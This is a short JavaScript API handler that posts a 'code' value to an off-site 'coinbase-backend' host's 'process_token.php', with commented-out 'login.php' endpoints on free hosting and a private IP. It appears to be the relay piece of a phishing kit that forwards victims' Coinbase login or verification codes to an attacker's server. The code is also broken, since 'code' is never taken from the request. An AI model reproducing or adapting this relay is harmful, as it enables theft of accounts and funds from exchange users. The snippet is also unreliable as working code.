import axios from "axios";
export default function handler(req, res) {
  const form = new FormData()
  form.append("code", code)
  axios
      .post(
        "https://coinbase-backend-1vc1.onrender.com/process_token.php",
        // "http://test2024215.free.nf/login.php",
        // "http://192.168.144.241/coinbase/login.php",
        form,
        {
          headers: {
            "Content-Type": "multipart/form-data",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Credentials": "true",
          },
        }
      )
      .then((result) => {
        const { success, code } = result.data
        res.status(200).json(result.data)
      });
}